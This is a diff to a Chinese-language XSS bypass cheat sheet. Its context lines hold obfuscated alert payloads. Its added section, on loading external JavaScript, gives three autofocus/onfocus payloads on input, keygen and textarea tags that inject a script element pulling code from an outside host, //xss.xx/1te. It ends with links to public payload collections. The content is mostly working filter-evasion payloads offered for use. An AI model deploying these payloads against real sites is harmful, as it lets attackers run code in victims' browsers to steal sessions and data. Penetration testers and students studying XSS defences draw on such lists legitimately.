@@ -225,3 +225,21 @@ top可以连接一个函数，那么直接连接alert就行了，如果你看过
 <svg onmouseover=Set.constructor`al\x65rt\x28/xss/\x29```>
 <svg onmouseover=\u0063lear.constructor`al\x65rt\x28/xss/\x29```>
 ```
+
+#### 引用外部js
+- - -
+用些生僻标签就可以，过多的花里胡哨反而难以绕过。
+
+![28](https://ws1.sinaimg.cn/large/005DAKuvgy1g20wug4o4nj30vn0anjsj.jpg)
+
+```html
+<input autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te">
+<keygen autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te">
+<textarea  autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te">
+```
+
+### 参考致谢
+- - -
+* http://www.vulnerability-lab.com/resources/documents/531.txt
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
